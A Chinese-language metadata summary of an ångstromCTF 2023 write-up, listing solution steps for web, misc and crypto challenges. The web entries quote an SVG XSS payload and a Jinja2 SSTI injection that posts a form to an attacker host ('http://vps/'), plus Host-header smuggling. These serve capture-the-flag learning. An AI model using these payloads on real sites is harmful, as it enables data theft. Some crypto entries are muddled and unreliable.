...
quality: high
full_path: ångstromCTF_2023_WP.full.md
meta_path: ångstromCTF_2023_WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: ångstromCTF 2023 WP。ångstromCTF 2023 综合 WP，覆盖 Web 入门到 Jinja2 SSTI 提权、Misc 文件还原、Crypto RSA/LFSR/坐标下降等多个领域。。经验：SVG XSS 需 url 编码；Jinja2 `render_template_string(page, fails=...
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/112826.html
reasoning_chain:
- 触发点:catch me if you can 抓包 flag/shortcircuit 反写 swap3 → 假设:JS 变量可换 → 动作:抓包 + swap3
- 触发点:hallmark SVG XSS → 假设:type[]=image/svg+xml 可注 → 动作:payload = <svg><script>xmlhttp=new XMLHttpRequest();...fetch('https://hallmark.web.actf.co/flag')</script></svg>
- 触发点:brokenlogin jinja2 SSTI 25 字节限制 → 假设:request.args|safe 绕 escape → 动作:?message={{request.args|safe}}&r=<form action=http://vps/ method=POST>
- 触发点:Celeste Speedrunning 时间戳溢出 → 假设:时间戳 32-bit overflow → 动作:整数溢出
- '触发点:Celeste Tunneling Host: flag.local → 假设:Host header 走私 → 动作:Host: flag.local'
- 触发点:Pusheen.txt zip base64 反解 → 假设:zip + base64 → 动作:解码 base64 + 解 zip
- 触发点:Extremely Safe Vault 65537 RSA + 65535 e 二项式 → 假设:Wiener attack → 动作:二项式分解
- 触发点:Simple Storage Program 翻转位+对称差 → 假设:简单位翻转 → 动作:对称差求解
failed_attempts:
- 试图用 fetch 读 cookie → 失败:Same-Origin Policy
- 试图不解 r= 表单 → 失败:admin bot 必须 form 提交
- 试图不解 zip → 失败:必须 base64 反解后再解 zip
key_observations:
- SVG XSS 需 url 编码
- Jinja2 `render_template_string(page, fails=fails)` 中 `fails` 用户可控可注入
- Host 头走私走 SECRETSITE 比对
- Python zipfile 还原 base64 串
- AES-CBC 字节翻转需改前一密文块对应字节
prerequisites:
- Jinja2 SSTI 漏洞利用
- SVG XSS + url 编码
- Host header 走私
- Python zipfile + base64 解码
---
# ångstromCTF 2023 WP
